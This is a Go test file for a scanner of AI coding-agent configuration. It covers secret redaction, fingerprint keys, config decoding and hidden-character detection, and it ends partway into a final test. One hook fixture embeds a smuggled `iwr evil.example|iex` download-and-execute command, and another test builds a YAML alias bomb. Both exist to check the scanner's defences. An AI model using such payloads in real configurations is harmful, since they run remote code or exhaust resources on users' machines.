package kit

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/adapters"
	"github.com/vgmartinez/tripcord/internal/fpkey"
	"github.com/vgmartinez/tripcord/internal/model"
)

// testKey is the k1 fingerprint key the kit tests use. fpkey.New
// requires a hex string, so this is 64 hex characters.
const testKey = "fee1deadfee1deadfee1deadfee1deadfee1deadfee1deadfee1deadfee1dead"

// source is a k1 source: the tests that expect entries differing only in
// a secret to get different keys use it.
func source(scope model.Scope, path string) *Source {
	k, err := fpkey.New(testKey)
	if err != nil {
		panic(err)
	}
	c := NewCollector(model.HarnessCodex, "Codex")
	c.SetHome("/home/dev")
	c.SetFingerprintKey(k)
	return c.Source(scope, path, nil)
}

// s1Source is a source with no fingerprint key.
func s1Source(scope model.Scope, path string) *Source {
	c := NewCollector(model.HarnessCodex, "Codex")
	c.SetHome("/home/dev")
	return c.Source(scope, path, nil)
}

func TestSanitize(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, in, want string
		removed        bool
	}{
		{"url query", "curl https://h.example/x?token=abc#frag", "curl https://h.example/x", true},
		{"url userinfo", "git clone https://user:pw@h.example/r.git", "git clone https://h.example/r.git", true},
		{"secret flag", "tool --api-key sk-123 run", "tool --api-key [REDACTED] run", true},
		{"bearer", "curl -H 'Authorization: Bearer abc.def'", "curl -H 'Authorization: Bearer [REDACTED]'", true},
		{"plain", "npm test", "npm test", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := source(model.ScopeRepo, "a").Sanitize(tc.in)
			if got.Value != tc.want {
				t.Fatalf("Sanitize(%q) = %q, want %q", tc.in, got.Value, tc.want)
			}
			if (len(got.Removed) > 0) != tc.removed {
				t.Fatalf("removed = %v", got.Removed)
			}
		})
	}
}

func TestHomeRewriteOnlyInUserScope(t *testing.T) {
	t.Parallel()
	in := "/home/dev/bin/hook /home/developer/x"
	if got := source(model.ScopeUser, "~/a").SafeString(in); got != "~/bin/hook /home/developer/x" {
		t.Fatalf("user scope: %q", got)
	}
	for _, scope := range []model.Scope{model.ScopeRepo, model.ScopeManaged} {
		path := "a"
		if scope == model.ScopeManaged {
			path = "/etc/a"
		}
		if got := source(scope, path).SafeString(in); got != in {
			t.Fatalf("%s scope rewrote home: %q", scope, got)
		}
	}
}

func TestDiscriminatorSeparatesSecrets(t *testing.T) {
	t.Parallel()
	key := func(url string) []string {
		s := source(model.ScopeRepo, "a")
		s.Add(model.ConfigKindMCPServer, []string{"mcp", "x"}, map[string]any{"url": s.SafeString(url)})
		var parts []string
		if err := json.Unmarshal([]byte(addedKey(t, s.c)), &parts); err != nil {
			t.Fatal(err)
		}
		return parts
	}
	a := key("https://h.example/?k=one")
	b := key("https://h.example/?k=two")
	plain := key("https://h.example/")
	if EvidenceKey(a) == EvidenceKey(b) || len(plain) != 3 || len(a) != 4 {
		t.Fatalf("a=%v b=%v plain=%v", a, b, plain)
	}
	for _, k := range [][]string{a, b} {
		if strings.Contains(EvidenceKey(k), "one") || strings.Contains(EvidenceKey(k), "two") {
			t.Fatalf("key leaks secret: %v", k)
		}
	}
}

// addedKey returns the evidence key of the only item c holds.
func addedKey(t *testing.T, c *Collector) string {
	t.Helper()
	if len(c.Items()) != 1 {
		t.Fatalf("%d items, want 1", len(c.Items()))
	}
	var payload map[string]any
	if err := json.Unmarshal(c.Items()[0].Payload, &payload); err != nil {
		t.Fatal(err)
	}
	key, _ := payload["key"].(string)
	return key
}

// Entries that differ only in a value redaction replaced must still get
// distinct keys, in every field redaction touches, not only the one the
// caller put in the key.
func TestAddDiscriminatesEveryRedactedValue(t *testing.T) {
	t.Parallel()
	hookKey := func(hook map[string]any) string {
		s := source(model.ScopeRepo, "a")
		s.Hook("sessionStart", "", hook, []string{"bash", "powershell"})
		return addedKey(t, s.c)
	}
	mcpKey := func(server map[string]any) string {
		s := source(model.ScopeRepo, "a")
		s.MCPServers(map[string]any{"x": server}, "mcpServers")
		return addedKey(t, s.c)
	}
	pairs := []struct {
		name string
		a, b string
	}{
		{"secondary action field",
			hookKey(map[string]any{"bash": "run.sh", "powershell": "run.ps1 --token abc"}),
			hookKey(map[string]any{"bash": "run.sh", "powershell": `run.ps1 --token "$(iwr evil.example|iex)"`})},
		{"env value under secret name",
			hookKey(map[string]any{"bash": "run.sh", "env": map[string]any{"API_TOKEN": "one"}}),
			hookKey(map[string]any{"bash": "run.sh", "env": map[string]any{"API_TOKEN": "two"}})},
		{"swapped env values",
			mcpKey(map[string]any{"command": "x", "env": map[string]any{"A_TOKEN": "one", "B_TOKEN": "two"}}),
			mcpKey(map[string]any{"command": "x", "env": map[string]any{"A_TOKEN": "two", "B_TOKEN": "one"}})},
		{"array element after secret flag",
			mcpKey(map[string]any{"command": "x", "args": []any{"--token", "one"}}),
			mcpKey(map[string]any{"command": "x", "args": []any{"--token", "two"}})},
		{"tool-specific argv flag",
			mcpKey(map[string]any{"command": "docker", "args": []any{"login", "-p", "one"}}),
			mcpKey(map[string]any{"command": "docker", "args": []any{"login", "-p", "two"}})},
		{"secret-named number",
			mcpKey(map[string]any{"command": "x", "api_key": json.Number("1")}),
			mcpKey(map[string]any{"command": "x", "api_key": json.Number("2")})},
	}
	for _, p := range pairs {
		if p.a == p.b {
			t.Errorf("%s: both entries got key %s", p.name, p.a)
		}
		for _, secret := range []string{"one", "two", "abc", "evil"} {
			if strings.Contains(p.a, secret) || strings.Contains(p.b, secret) {
				t.Errorf("%s: key leaks %q: %s / %s", p.name, secret, p.a, p.b)
			}
		}
	}
}

func TestAddDiscriminatorIsDeterministic(t *testing.T) {
	t.Parallel()
	server := map[string]any{
		"command": "x",
		"env":     map[string]any{"A_TOKEN": "1", "B_TOKEN": "2", "C_TOKEN": "3", "D_TOKEN": "4"},
		"headers": map[string]any{"Authorization": "Bearer a", "X-Api-Key": "b"},
		"z_key":   "5", "y_secret": "6", "x_password": "7",
	}
	var first string
	for i := 0; i < 200; i++ {
		s := source(model.ScopeRepo, "a")
		s.MCPServers(map[string]any{"x": server}, "mcpServers")
		got := addedKey(t, s.c)
		if i == 0 {
			first = got
		} else if got != first {
			t.Fatalf("run %d: key %s, want %s", i, got, first)
		}
	}
}

func TestAddDiscriminatorIndependentOfHome(t *testing.T) {
	t.Parallel()
	key := func(home string) string {
		c := NewCollector(model.HarnessCodex, "Codex")
		c.SetHome(home)
		s := c.Source(model.ScopeUser, "~/.codex/config.toml", nil)
		s.MCPServers(map[string]any{"x": map[string]any{"command": "x", "env": map[string]any{"API_KEY": home + "/key.pem"}}}, "mcp_servers")
		return addedKey(t, c)
	}
	if a, b := key("/home/alice"), key("/home/bob"); a != b {
		t.Fatalf("key depends on home: %s vs %s", a, b)
	}
}

func TestSafeValueRedactsSecretNamesAndFlagArguments(t *testing.T) {
	t.Parallel()
	s := source(model.ScopeRepo, "a")
	got := s.SafeValue("", map[string]any{
		"api_key": "sk-1",
		"args":    []any{"--token", "abc", "--verbose"},
		"nested":  map[string]any{"password": json.Number("12")},
		"enabled": true,
	})
	raw, _ := json.Marshal(got)
	for _, leak := range []string{"sk-1", "abc", `"12"`, ":12"} {
		if strings.Contains(string(raw), leak) {
			t.Fatalf("leaked %q: %s", leak, raw)
		}
	}
	if !strings.Contains(string(raw), `"--verbose"`) || !strings.Contains(string(raw), `"enabled":true`) {
		t.Fatalf("dropped non-secret values: %s", raw)
	}
}

// TestSafeValueRedactsBearerSchemeInArray is the repro for an MCP
// server's args split across two array elements, ["Bearer", "TOKEN"]:
// neither element alone matches Sanitize's bearerToken regex (it needs
// "Bearer TOKEN" in one string), so without this, the credential
// element reaches the payload unredacted.
func TestSafeValueRedactsBearerSchemeInArray(t *testing.T) {
	t.Parallel()
	s := source(model.ScopeRepo, "a")
	got := s.SafeValue("", map[string]any{
		"args": []any{"mcp-remote", "--header", "Authorization", "Bearer", "sk-live-secret"},
	})
	raw, _ := json.Marshal(got)
	if strings.Contains(string(raw), "sk-live-secret") {
		t.Fatalf("leaked bearer token: %s", raw)
	}
	for _, kept := range []string{"mcp-remote", "--header", "Authorization", "Bearer"} {
		if !strings.Contains(string(raw), kept) {
			t.Fatalf("dropped non-secret element %q: %s", kept, raw)
		}
	}
}

// TestSafeValueGatesUserFlagOnUserPassShape is curl's -u/--user flag: the
// element after it is a credential only when it has "user:pass" shape
// (output.LooksLikeUserPass); "sudo -u root" must not redact "root".
func TestSafeValueGatesUserFlagOnUserPassShape(t *testing.T) {
	t.Parallel()
	s := source(model.ScopeRepo, "a")
	got := s.SafeValue("", map[string]any{
		"args": []any{"-u", "alice:s3cr3t-pass", "sudo", "-u", "root"},
	})
	raw, _ := json.Marshal(got)
	if strings.Contains(string(raw), "s3cr3t-pass") {
		t.Fatalf("leaked user:pass credential: %s", raw)
	}
	if !strings.Contains(string(raw), `"root"`) {
		t.Fatalf("redacted a plain username with no password: %s", raw)
	}
}

// TestWalkScopedTagsNonRepositoryRoots is the first non-repository
// caller of the repository walker (a user-scope skill directory):
// diagnostics must carry its scope and be reported under pathPrefix, not
// always ScopeRepo and a bare repo-relative path, and the wording must
// not call a skill directory "the repository".
func TestWalkScopedTagsNonRepositoryRoots(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	reader, err := adapters.NewSafeReader(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = reader.Close() }()

	limits := Limits{MaxEntries: 0, MaxDepth: 32, MaxFiles: 10, MaxBytes: 1024, MaxFile: 1024}
	c := NewCollector(model.HarnessCodex, "Codex")
	m := Matcher{Candidate: func(string) bool { return true }, Relevant: func(string) bool { return true }}

	if _, err := WalkScoped(context.Background(), reader, limits, c, model.ScopeUser, "~/.agents/skills", m); err != nil {
		t.Fatalf("WalkScoped: %v", err)
	}
	diags := c.Diagnostics()
	if len(diags) != 1 {
		t.Fatalf("diagnostics = %+v", diags)
	}
	d := diags[0]
	if d.Scope != model.ScopeUser {
		t.Fatalf("scope = %s, want user", d.Scope)
	}
	if d.Path != "~/.agents/skills" {
		t.Fatalf("path = %q, want the pathPrefix", d.Path)
	}
	if strings.Contains(d.Message, "repository") || !strings.Contains(d.Message, "directory walk truncated") {
		t.Fatalf("message = %q, want directory wording, not repository", d.Message)
	}
}

// TestWalkRepoWordingUnchanged pins Walk's existing repository wording
// and ScopeRepo tagging now that WalkScoped backs it, so a caller that
// still means a repository sees byte-for-byte the same diagnostic text.
func TestWalkRepoWordingUnchanged(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	reader, err := adapters.NewSafeReader(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = reader.Close() }()

	limits := Limits{MaxEntries: 0, MaxDepth: 32, MaxFiles: 10, MaxBytes: 1024, MaxFile: 1024}
	c := NewCollector(model.HarnessCodex, "Codex")
	m := Matcher{Candidate: func(string) bool { return true }, Relevant: func(string) bool { return true }}

	if _, err := Walk(context.Background(), reader, limits, c, m); err != nil {
		t.Fatalf("Walk: %v", err)
	}
	diags := c.Diagnostics()
	if len(diags) != 1 {
		t.Fatalf("diagnostics = %+v", diags)
	}
	d := diags[0]
	if d.Scope != model.ScopeRepo || d.Path != "" {
		t.Fatalf("scope = %s, path = %q, want repo scope and no path", d.Scope, d.Path)
	}
	want := "repository walk truncated: too many directory entries; configuration beyond the limit was not scanned"
	if d.Message != want {
		t.Fatalf("message = %q, want %q", d.Message, want)
	}
}

func TestDecodeJSON(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		syntax  Syntax
		in      string
		wantErr string
		warn    string
	}{
		{"strict ok", StrictJSON, `{"a":1}`, "", ""},
		{"strict bom", StrictJSON, "\ufeff{}", "byte order mark", ""},
		{"strict comment", StrictJSON, "{// x\n}", "invalid character", ""},
		{"jsonc bom comments trailing comma", JSONC, "\ufeff{/* a */\"a\": [1, 2,], // c\n}", "", ""},
		{"jsonc unterminated comment", JSONC, `{"a":1 /*`, "unterminated", ""},
		{"jsonc comment in string kept", JSONC, `{"a":"// not a comment"}`, "", ""},
		{"duplicate", StrictJSON, `{"a":1,"a":2}`, "", "duplicate key"},
		{"case variant", StrictJSON, `{"hooks":{},"Hooks":{}}`, "", "case-variant"},
		{"two values", StrictJSON, `{} {}`, "more than one", ""},
		{"deep", StrictJSON, strings.Repeat("[", 100) + strings.Repeat("]", 100), "nesting", ""},
		{"crlf", StrictJSON, "{\r\n\"a\": 1\r\n}", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, warnings, err := DecodeJSON([]byte(tc.in), tc.syntax, "Codex")
			if tc.wantErr == "" && err != nil {
				t.Fatalf("err = %v", err)
			}
			if tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("err = %v, want %q", err, tc.wantErr)
			}
			if tc.warn != "" && !strings.Contains(strings.Join(warnings, "\n"), tc.warn) {
				t.Fatalf("warnings = %v, want %q", warnings, tc.warn)
			}
		})
	}
}

func TestDecodeJSONCKeepsOffsets(t *testing.T) {
	t.Parallel()
	_, _, err := DecodeJSON([]byte("{/* comment */ \"a\": }"), JSONC, "Cursor")
	if err == nil {
		t.Fatal("accepted invalid JSONC")
	}
}

func TestDecodeTOML(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		in      string
		wantErr string
		warn    string
	}{
		{"ok", "sandbox_mode = \"read-only\"\n[mcp_servers.a]\ncommand = \"x\"\n", "", ""},
		{"crlf", "a = 1\r\nb = 2\r\n", "", ""},
		{"bom", "\ufeffa = 1\n", "byte order mark", ""},
		{"duplicate key", "a = 1\na = 2\n", "line 2", ""},
		{"case variant", "[mcp_servers]\n[mcp_servers.A]\ncommand=\"x\"\n[mcp_servers.a]\ncommand=\"y\"\n", "", "case-variant"},
		{"malformed", "a = \n", "line 1", ""},
		{"deep", "a = " + strings.Repeat("[", 100) + strings.Repeat("]", 100) + "\n", "nesting", ""},
		{"nan", "a = nan\n", "", ""},
		{"datetime", "a = 1979-05-27T07:32:00Z\n", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			tree, warnings, err := DecodeTOML([]byte(tc.in), "Codex")
			if tc.wantErr == "" && err != nil {
				t.Fatalf("err = %v", err)
			}
			if tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("err = %v, want %q", err, tc.wantErr)
			}
			if tc.warn != "" && !strings.Contains(strings.Join(warnings, "\n"), tc.warn) {
				t.Fatalf("warnings = %v, want %q", warnings, tc.warn)
			}
			if err == nil {
				if _, err := json.Marshal(tree); err != nil {
					t.Fatalf("tree is not JSON-encodable: %v", err)
				}
			}
		})
	}
}

func TestDecodeYAML(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		in      string
		wantErr string
		warn    string
	}{
		{"ok", "on: push\njobs: {}\n", "", ""},
		{"bom crlf", "\ufeffa: 1\r\nb: 2\r\n", "", ""},
		{"alias", "a: &x 1\nb: *x\n", "aliases", ""},
		{"merge", "a: &x {k: 1}\nb:\n  <<: *x\n", "", ""},
		{"duplicate", "a: 1\na: 2\n", "", "duplicate key"},
		{"case variant", "hooks: 1\nHooks: 2\n", "", "case-variant"},
		{"deep", strings.Repeat("[", 100) + strings.Repeat("]", 100), "nesting", ""},
		{"malformed", "a: [\n", "yaml", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, warnings, err := DecodeYAML([]byte(tc.in), "Copilot")
			if tc.name == "merge" {
				// The merge source is an alias, which fails closed first.
				if err == nil {
					t.Fatal("accepted")
				}
				return
			}
			if tc.wantErr == "" && err != nil {
				t.Fatalf("err = %v", err)
			}
			if tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("err = %v, want %q", err, tc.wantErr)
			}
			if tc.warn != "" && !strings.Contains(strings.Join(warnings, "\n"), tc.warn) {
				t.Fatalf("warnings = %v, want %q", warnings, tc.warn)
			}
		})
	}
}

func TestDecodeYAMLAliases(t *testing.T) {
	t.Parallel()
	t.Run("normal anchor and alias workflow parses and is scanned", func(t *testing.T) {
		t.Parallel()
		doc := `on: push
jobs:
  copilot-setup-steps:
    runs-on: ubuntu-latest
    env: &shared_env
      NODE_ENV: production
      CI: "true"
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: install
        run: npm ci
        env: *shared_env
      - name: build
        run: npm run build
        env: *shared_env
`
		tree, warnings, err := DecodeYAMLAliases([]byte(doc), "GitHub Actions", AliasLimits{MaxAliases: 100, MaxNodes: 10_000})
		if err != nil {
			t.Fatalf("legitimate anchor/alias workflow was rejected: %v (warnings %v)", err, warnings)
		}
		workflow, ok := tree.(map[string]any)
		if !ok {
			t.Fatalf("tree = %T, want map", tree)
		}
		jobs, ok := workflow["jobs"].(map[string]any)
		if !ok {
			t.Fatalf("jobs = %T, want map", workflow["jobs"])
		}
		job, ok := jobs["copilot-setup-steps"].(map[string]any)
		if !ok {
			t.Fatalf("job = %T, want map", jobs["copilot-setup-steps"])
		}
		steps, ok := job["steps"].([]any)
		if !ok || len(steps) != 3 {
			t.Fatalf("steps = %+v", job["steps"])
		}
		install, ok := steps[1].(map[string]any)
		if !ok {
			t.Fatalf("step[1] = %T", steps[1])
		}
		env, ok := install["env"].(map[string]any)
		if !ok || env["NODE_ENV"] != "production" || env["CI"] != "true" {
			t.Fatalf("alias did not expand to the anchored env block: %+v", install["env"])
		}
	})
	t.Run("billion laughs alias bomb is rejected", func(t *testing.T) {
		t.Parallel()
		// Nine levels of anchors, each a 9-element sequence of the
		// previous level's alias, expand to 9^9 (> 387 million) leaf
		// nodes if followed without a limit.
		var b strings.Builder
		letters := "abcdefghi"
		for i, letter := range letters {
			b.WriteString(string(letter))
			b.WriteString(": &")
			b.WriteString(string(letter))
			b.WriteString(" [")
			if i == 0 {
				b.WriteString(`"lol","lol","lol","lol","lol","lol","lol","lol","lol"`)
			} else {
				prev := string(letters[i-1])
				for j := 0; j < 9; j++ {
					if j > 0 {
						b.WriteString(",")
					}
					b.WriteString("*" + prev)
				}
			}
			b.WriteString("]\n")
		}
		_, _, err := DecodeYAMLAliases([]byte(b.String()), "GitHub Actions", AliasLimits{MaxAliases: 100, MaxNodes: 10_000})
		if err == nil {
			t.Fatal("alias bomb was accepted")
		}
		if !strings.Contains(err.Error(), "aliases") && !strings.Contains(err.Error(), "nodes") {
			t.Fatalf("err = %v, want an alias- or node-limit error", err)
		}
	})
	t.Run("zero value rejects any alias, like DecodeYAML", func(t *testing.T) {
		t.Parallel()
		_, _, err := DecodeYAMLAliases([]byte("a: &x 1\nb: *x\n"), "GitHub Actions", AliasLimits{})
		if err == nil || !strings.Contains(err.Error(), "aliases") {
			t.Fatalf("err = %v, want an aliases-not-supported error", err)
		}
	})
	t.Run("merge keys remain unsupported", func(t *testing.T) {
		t.Parallel()
		_, _, err := DecodeYAMLAliases([]byte("a: &x {k: 1}\nb:\n  <<: *x\n"), "GitHub Actions", AliasLimits{MaxAliases: 100, MaxNodes: 10_000})
		if err == nil {
			t.Fatal("merge key was accepted")
		}
	})
}

func TestSplitFrontmatter(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		in    string
		front string
		found bool
		err   bool
	}{
		{"none", "# title\n", "", false, false},
		{"lf", "---\na: 1\n---\nbody", "a: 1\n", true, false},
		{"crlf bom", "\ufeff---\r\na: 1\r\n---\r\nbody", "a: 1\n", true, false},
		{"trailing space", "--- \na: 1\n---\t\n", "a: 1\n", true, false},
		{"unclosed", "---\na: 1\n", "", true, true},
		{"empty", "---\n---\n", "", true, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			front, found, err := SplitFrontmatter([]byte(tc.in))
			if string(front) != tc.front || found != tc.found || (err != nil) != tc.err {
				t.Fatalf("got %q %v %v", front, found, err)
			}
		})
	}
}

func TestMarkdownLooseFrontmatter(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessCursor, "Cursor")
	s := c.Source(model.ScopeRepo, ".cursor/rules/a.mdc", nil)
	raw := []byte("---\nglobs: *.ts\nalwaysApply: false\n---\nSee https://h.example/doc?sig=secret\n")
	s.Markdown(model.ConfigKindInstructions, "rule", raw, LooseFrontmatter)
	if len(c.Diagnostics()) != 0 || len(c.Items()) != 1 {
		t.Fatalf("diags %v items %v", c.Diagnostics(), c.Items())
	}
	payload := string(c.Items()[0].Payload)
	if strings.Contains(payload, "secret") || !strings.Contains(payload, `"globs":"*.ts"`) {
		t.Fatalf("payload = %s", payload)
	}
}

// TestMarkdownHiddenChars checks that hidden code points are located in
// the whole raw file, frontmatter included, and that an instruction file
// that is not valid UTF-8 is a diagnostic while a skill is not.
func TestMarkdownHiddenChars(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessCursor, "Cursor")
	c.Source(model.ScopeRepo, ".cursor/rules/a.mdc", nil).Markdown(model.ConfigKindInstructions, "rule", []byte("---\nglobs: \u202e*.ts\n---\nok\u200b\n"), LooseFrontmatter)
	items := c.Items()
	want := []model.HiddenRun{{CodePoint: 0x202E, Line: 2, Column: 8, Length: 1}, {CodePoint: 0x200B, Line: 4, Column: 3, Length: 1}}
	if len(items) != 1 || !slices.Equal(items[0].Hidden.Runs, want) || items[0].Hidden.Total != 2 || len(c.Diagnostics()) != 0 {
		t.Fatalf("items %+v diags %v", items, c.Diagnostics())
	}
	if strings.Contains(string(items[0].Payload), "Hidden") {
		t.Fatalf("payload carries the annotation: %s", items[0].Payload)
	}

	c = NewCollector(model.HarnessCursor, "Cursor")
	c.Source(model.ScopeRepo, "AGENTS.md", nil).Markdown(model.ConfigKindInstructions, "agents", []byte("a\xff\u2066b"), LooseFrontmatter)
	c.Source(model.ScopeRepo, "skills/x/SKILL.md", nil).Markdown(model.ConfigKindSkill, "skill", []byte("a\xffb"), LooseFrontmatter)
	diags := c.Diagnostics()
	if len(diags) != 1 || diags[0].Path != "AGENTS.md" || !strings.Contains(diags[0].Message, InvalidUTF8) {
		t.Fatalf("diags = %v", diags)
	}
	if got := c.Items()[0].Hidden.Total; got != 1 {
		t.Fatalf("hidden total = %d, want 1", got)
	}
}

func TestManagedPath(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		`C:\ProgramData\Cursor\hooks.json`:     "C:/programdata/cursor/hooks.json",
		"c:/ProgramData/x":                     "C:/programdata/x",
		"/Library/Application Support/Cursor/": "/Library/Application Support/Cursor/",
		"/etc/codex/config.toml":               "/etc/codex/config.toml",
	}
	for in, want := range cases {
		if got := ManagedPath(in); got != want {
			t.Errorf("ManagedPath(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestAddDistinguishesEntriesWithTheSameCallerKey checks that two items
// whose caller-supplied key parts match, but whose payload otherwise
// differs, still get distinct evidence keys: Add appends a digest of the
// full payload (see PayloadDigest). Without it, the shorter of SARIF's
// two keys would be free to hide the other by fingerprint, for example
// when a tool de-duplicates alerts by fingerprint.
func TestAddDistinguishesEntriesWithTheSameCallerKey(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessCopilot, "Copilot")
	src := c.Source(model.ScopeRepo, ".github/workflows/copilot-setup-steps.yml", nil)
	src.Add(model.ConfigKindEnvSetup, []string{"step", "copilot-setup-steps", ""}, map[string]any{"uses": "actions/github-script@v7", "with": map[string]any{"script": "one()"}})
	src.Add(model.ConfigKindEnvSetup, []string{"step", "copilot-setup-steps", ""}, map[string]any{"uses": "actions/github-script@v7", "with": map[string]any{"script": "two()"}})
	items := c.Items()
	if len(items) != 2 {
		t.Fatalf("items = %d, want 2", len(items))
	}
	k1 := kittestKey(t, items[0])
	k2 := kittestKey(t, items[1])
	if k1 == k2 {
		t.Fatalf("two steps with the same label but different content share a key: %s", k1)
	}
}

// TestAddKeyIgnoresWithFieldFacts checks that a WithField fact (such as
// Codex's project_trust, which depends on which scopes this scan read,
// not on the file's own content) never affects the evidence key: folding
// it into the digest would make a repository fingerprint depend on
// whether the scanning machine also read user scope, which
// docs/fingerprint.md forbids.
func TestAddKeyIgnoresWithFieldFacts(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessCodex, "Codex")
	src := c.Source(model.ScopeRepo, ".codex/config.toml", nil)
	src.WithField("project_trust", "unset").Add(model.ConfigKindPermissions, []string{"setting", "sandbox_mode"}, map[string]any{"setting": "sandbox_mode", "value": "read-only"})
	c2 := NewCollector(model.HarnessCodex, "Codex")
	src2 := c2.Source(model.ScopeRepo, ".codex/config.toml", nil)
	src2.WithField("project_trust", "unknown").Add(model.ConfigKindPermissions, []string{"setting", "sandbox_mode"}, map[string]any{"setting": "sandbox_mode", "value": "read-only"})
	if k1, k2 := kittestKey(t, c.Items()[0]), kittestKey(t, c2.Items()[0]); k1 != k2 {
		t.Fatalf("key changed with project_trust: %q vs %q", k1, k2)
	}
}

func kittestKey(t *testing.T, item model.ConfigItem) string {
	t.Helper()
	var payload map[string]any
	if err := json.Unmarshal(item.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	key, _ := payload["key"].(string)
	return key
}

// TestPayloadDigestDeterministic repeats the same Add call 200 times and
// checks every resulting key is byte-identical: Go randomizes map
// iteration order per run, so any code that built the digest by ranging
// over a map without sorting first would be caught by this, sooner or
// later, across repeats.
func TestPayloadDigestDeterministic(t *testing.T) {
	t.Parallel()
	payload := func() map[string]any {
		return map[string]any{
			"a": 1, "b": "two", "c": []any{"x", "y", "z"},
			"env": map[string]any{"A": "1", "B": "2", "C": "3"},
			"nested": map[string]any{
				"p": map[string]any{"q": 1, "r": 2}, "s": []any{1, 2, 3},
			},
		}
	}
	first := PayloadDigest(payload())
	for i := 0; i < 200; i++ {
		if got := PayloadDigest(payload()); got != first {
			t.Fatalf("iteration %d: digest = %s, want %s", i, got, first)
		}
	}
}

func TestResolveUserDir(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessCodex, "Codex")
	dir, ok := ResolveUserDir(c, "/home/dev", "CODEX_HOME", "", ".codex")
	if !ok || dir.Logical != "~/.codex" {
		t.Fatalf("default: %+v %v", dir, ok)
	}
	dir, ok = ResolveUserDir(c, "/home/dev", "CODEX_HOME", "/home/dev/alt", ".codex")
	if !ok || dir.Logical != "~/alt" {
		t.Fatalf("inside home: %+v", dir)
	}
	dir, ok = ResolveUserDir(c, "/home/dev", "CODEX_HOME", "/opt/codex", ".codex")
	if !ok || dir.Logical != "~/CODEX_HOME" || len(c.Diagnostics()) != 1 || c.Diagnostics()[0].Informational {
		t.Fatalf("outside home: %+v %v", dir, c.Diagnostics())
	}
	if _, ok := ResolveUserDir(c, "/home/dev", "CODEX_HOME", "relative", ".codex"); ok {
		t.Fatal("accepted a relative override")
	}
}

func TestResolveXDGDir(t *testing.T) {
	t.Parallel()
	c := NewCollector(model.HarnessOpenCode, "OpenCode")
	dir := ResolveXDGDir(c, "/home/dev", "XDG_CONFIG_HOME", "", ".config")
	if dir.Logical != "~/.config" || len(c.Diagnostics()) != 0 {
		t.Fatalf("default: %+v %v", dir, c.Diagnostics())
	}
	dir = ResolveXDGDir(c, "/home/dev", "XDG_CONFIG_HOME", "relative", ".config")
	if dir.Abs != "/home/dev/.config" || dir.Logical != "~/.config" || len(c.Diagnostics()) != 0 {
		t.Fatalf("relative value was not ignored: %+v %v", dir, c.Diagnostics())
	}
	dir = ResolveXDGDir(c, "/home/dev", "XDG_CONFIG_HOME", "/home/dev/xdg", ".config")
	if dir.Logical != "~/xdg" || len(c.Diagnostics()) != 0 {
		t.Fatalf("inside home: %+v %v", dir, c.Diagnostics())
	}
	dir = ResolveXDGDir(c, "/home/dev", "XDG_DATA_HOME", "/var/xdg", ".local/share")
	if dir.Logical != "~/XDG_DATA_HOME" || len(c.Diagnostics()) != 1 || !c.Diagnostics()[0].Informational {
		t.Fatalf("outside home: %+v %v", dir, c.Diagnostics())
	}
}

func TestResolveHomeRejectsRoot(t *testing.T) {
	t.Parallel()
	for _, home := range []string{"/", `C:\`} {
		c := NewCollector(model.HarnessCodex, "Codex")
		if _, ok := ResolveHome(c, home); ok || len(c.Diagnostics()) != 1 {
			t.Fatalf("home %q accepted", home)
		}
	}
}

func TestHooksShapes(t *testing.T) {
	t.Parallel()
	grouped := map[string]any{"Stop": []any{map[string]any{"matcher": "x", "hooks": []any{map[string]any{"type": "command", "command": "a"}}}}}
	flat := map[string]any{"stop": []any{map[string]any{"command": "b", "matcher": "y"}}}
	cases := []struct {
		name  string
		shape HookShape
		value any
		items int
		diags int
	}{
		{"grouped", Grouped, grouped, 1, 0},
		{"grouped rejects flat", Grouped, flat, 0, 1},
		{"flat", Flat, flat, 1, 0},
		{"either grouped", Either, grouped, 1, 0},
		{"either flat", Either, flat, 1, 0},
		{"not object", Flat, []any{}, 0, 1},
		{"event not array", Flat, map[string]any{"stop": "x"}, 0, 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			c := NewCollector(model.HarnessCursor, "Cursor")
			c.Source(model.ScopeRepo, ".cursor/hooks.json", nil).Hooks(tc.value, tc.shape, []string{"command"})
			if len(c.Items()) != tc.items || len(c.Diagnostics()) != tc.diags {
				t.Fatalf("items %d diags %v", len(c.Items()), c.Diagnostics())
			}
		})
	}
}

func TestFoldedObjectsSkipCaseVariantWarnings(t *testing.T) {
	t.Parallel()
